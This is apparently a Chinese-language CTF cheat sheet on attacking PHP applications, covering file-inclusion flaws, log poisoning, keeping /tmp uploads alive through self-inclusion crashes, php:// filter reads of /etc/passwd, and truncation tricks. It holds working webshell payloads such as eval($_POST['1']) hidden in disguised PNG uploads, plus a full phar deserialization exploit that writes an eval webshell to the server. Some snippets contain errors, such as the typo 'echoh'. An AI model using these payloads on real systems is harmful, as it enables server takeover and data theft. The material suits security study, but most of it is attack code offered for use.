
## 常用重要文件
```
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/var/log/apache2/error.log
```
## _FILES数组
$_FILES 数组提供了多个内容在文件上传时使用，比较重要的有以下几个：
```php
$_FILES['myFile']['name']// 客户端文件的原名称。 
$_FILES['myFile']['type']// 文件的 MIME 类型，需要浏览器提供该信息的支持，例如"image/gif"。 
$_FILES['myFile']['size'] //已上传文件的大小，单位为字节。 
$_FILES['myFile']['tmp_name'] //文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，默认是/tmp目录。
```
上传过程中还利用到了一个重要的函数  `move_uploaded_file()`，该方法是将上传的文件移动到新位置，若不加上这一行代码，临时文件在上传周期后就被删除而不会被存储。

move_uploaded_file(file,newloc)
## 文件包含漏洞
　　服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。
### 涉及到的危险函数
include(),require()和include_once(),require_once()
#### include
包含并运行指定文件，当包含外部文件发生错误时，系统给出警告，但整个php文件继续执行。
#### require
跟include唯一不同的是，当产生错误时候，include下面继续运行而require停止运行了。
#### include_once
这个函数跟include函数作用几乎相同，只是他在导入函数之前先检测下该文件是否被导入。如果已经执行一遍那么就不重复执行了。
#### require_once
这个函数跟require的区别 跟上面我所讲的include和include_once是一样的。所以我就不重复了


### 文件包含爆栈&上传
漏洞样例
```php
<?php
    include($_GET['c']);
?>
```
payload
```html
<html>
<meta charset="utf-8">
<body>
    <form name="upload" method="post" enctype="multipart/form-data" action="./self_include.php?c=self_include.php">
        File: <input type="file" name="file">
        <input type="submit" name="submit">
    </form>
</body>
</html>
```
PHP7中如果include(‘php://filter/string.strip_tags/resource=/etc/passwd’)，就会引起PHP程序直接崩溃

#### 文件包含getshell
利用bp发包
`http://localhost:9000/<?php phpinfo();?>` 会被及记录到log/access.log
`http://localhost:9000/upload/self_include.php?c=../logs/access.log` 进行文件包含即可

#### 利用php /tmp临时文件上传shell
题目复现：[blog进阶](https://www.ichunqiu.com/battalion?t=1&r=56951)
php对post过来的文件有一个默认处理流程，即在一个处理周期内（post,response），首先将post过来的文件保存在/tmp文件夹下，
文件名为php{0-9A-Za-z}的随机字符，如果文件被php文件本身用到了，则php直接使用/tmp里的这个临时文件，如果没用到或者处理完毕了，则将/tmp下的这个临时文件删除。
也就是说，在正常处理流程下，tmp目录下的这个文件存活周期是一次请求到响应，响应过后，它就会被删除，因为kindeditor那里存在的目录遍历漏洞，导致我们可以查看tmp目录下的文件列表，我们也可以对任一php文件post一个文件过去，使其暂存于tmp目录下，问题就在于，我们还没来得及包含这个文件，它就会在这次请求结束后被删除掉。
如何不让它被删除掉呢？删除和处理请求的都是php，所以我们要让php守护进程产生内存溢出，换言之，使之崩溃，而php自身是不会因为错误直接退出的，它会清空自己的内存堆栈，以便从错误中恢复，这就保证了web服务的正常运转的同时，打断了php对临时文件的处理。
自包含恰巧可以做到这一点，什么是自包含呢？
即： `/X.php?include=X.php`
这样X.php就会将它本身包含进来，而被包含进来的X.php再次尝试处理url的包含请求时，又将自己包含进来一遍，这就形成了无穷递归，递归会导致爆栈，使php无法进行此次请求的后续处理，也就是无法删除/tmp目录中我们通过post强行上传的临时文件
整理下php对一个post文件请求的正常处理流程：
1.manager.php接收一个Post请求，php在/tmp目录下创建我们post的文件
2.manager.php处理请求url，包含一个文件
3.manager.php进行文件处理
4.php删除/tmp目录下的临时文件

整理下这个漏洞的触发过程：
1. manager.php接收一个Post请求，php在/tmp目录下创建我们post的文件
2.manager.php处理请求url，不断自包含本身造成内存溢出
3.php发出内存溢出信号，清空缓冲区和调用堆栈，以便接收新的请求
4./tmp目录下的上传文件得以保留
5.包含/tmp目录下的上传文件形成webshell
![disable functions](php/2018-11-19-08-19-37.png)

## php伪协议
https://lorexxar.cn/2016/09/14/php-wei/
读取../flag.php
```
module=php://filter/read=convert.base64-encode/resource/../flag&name=php
include(‘php://filter/string.strip_tags/resource=/etc/passwd’)直接崩溃php，
```

## phar
### 一般利用
利用方法：
将下面代码压缩成zip文件，然后将后缀改为png后上传。
```php
<?=eval($_POST['1']);?>

<?php eval($_POST['1']);?>

<script language='php'>
	eval($_POST['1']);
</script>
```
之后用phar协议访问。
`/?act=get&pic=phar:///var/www/html/sandbox/5eac5f7bd6358e10ff53dec9f3bb8690/4a47a0db6e60853dedfcfdf08a5ca249.png/1.php`
### 反序列化
https://blog.csdn.net/xiaorouji/article/details/83118619
https://cloud.tencent.com/developer/article/1350367
exp：
```php
<?php

 class PicManager{
	 private $current_dir;
	 private $whitelist=['jpg','png','gif'];
	 private $logfile='request.log';
	 private $actions=[];

	 public function __construct($dir){
		 $this->current_dir=$dir;
		 if(!is_dir($dir))@mkdir($dir);
	 }

	 private function _log($message){
		 array_push($this->actions,'['.date('y-m-d h:i:s',time()).']'.$message);
	 }

	 public function pics(){
		 log('list pics');
		 $pics=[];
		 foreach(scandir($dir) as $item){
			 if(in_array(substr($item,-4),$whitelist))
				 array_push($pics,$current_dir."/".$item);
		 }
		 return $pics;
	 }
	 public function upload_pic(){
		 _log('upload pic');
		 $file=$_FILES['file']['name'];
		 if(!in_array(substr($file,-4),$this->whitelist)){
			 _log('unsafe deal:upload filename '.$file);
			 return;
		 }
		 $newname=md5($file).substr($file,-4);
		 move_uploaded_file($_FILES['file']['tmp_name'],$current_dir.'/'.$newname);
	 }
	 public function get_pic($picname){
		 _log('get pic'.$picname);
		 if(!file_exists($picname))
			 return '';
		 else return file_get_contents($picname);
	 }
	 public function __destruct(){
		 $fp=fopen($this->current_dir.'/'.$this->logfile,"a+");
		 foreach($this->actions as $act){
			 fwrite($fp,$act."\n");
		 }
		 fclose($fp);
	 }

	 public function gen(){
		 @rmdir($this->current_dir);
		 $this->current_dir="/var/www/html/sandbox/a6bfb20ba19df73fcceb438f5f75948f/"; //md5($_SERVER['REMOTE_ADDR'])
		 $this->logfile='H4lo.php';
		 $this->actions=['<?php eval($_REQUEST[p]);'];
		 @unlink('phar.phar');
		 
		 
		 $phar = new Phar("phar.phar");
		 $phar->startBuffering();
		 $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头用以欺骗检测
		 $phar->setMetadata($this); //将自定义meta-data存入manifest
		 $phar->addFromString("test.txt", "test"); //添加要压缩的文件
			     //签名自动计算
		 $phar->stopBuffering();

	 }
 }

$pic=new PicManager('/var/www/html/sandbox');
$pic->gen();
```
## 截断
### 00 截断
用于上传
magic_quotes_gpc=Off
php版本小于5.3.4
00无效时，使用0x0~0xff中的acsii字符尝试。

### iconv函数字符编码导致截断
char(128)到(255)之间的字符转换为gbk编码时为空值。
```php
<?php
$a = '1'.chr(130).'2';
echo $a."<br>";
echoh iconv('UTF-8','GBK',$a);
?>
```
### 其他截断
1. url %3f后面会当参数
2. sql注入中的注释，换行
3. 文件包含中，上传中长文件名，会对后缀名忽略。
